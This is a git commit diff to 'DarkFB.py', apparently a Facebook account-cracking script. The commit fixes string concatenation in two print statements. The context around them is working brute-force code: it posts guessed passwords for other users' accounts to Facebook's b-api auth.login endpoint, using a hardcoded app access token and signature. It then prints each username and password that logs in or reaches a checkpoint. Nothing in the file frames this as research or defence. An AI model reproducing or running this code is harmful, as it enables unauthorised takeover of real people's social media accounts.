31a43cfa6d67e7d262d2c83e9f709f9a2806492a
The Magizz <52248879+TheMagizz@users.noreply.github.com>
2019-06-29 22:08:41 +0700

    Update DarkFB.py

--- DarkFB.py
+++ DarkFB.py
@@ -700,10 +700,10 @@ def pilih_super():
                							    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                							    q = json.load(data)
                							    if 'access_token' in q:
-           							        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + ' b['name']
+           							        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
                							    else:
                    						        if 'www.facebook.com' in q['error_msg']:
-                       							    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' b['name']
+                       							    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6 + ' ==> ' + b['name']
 
         except:
             pass
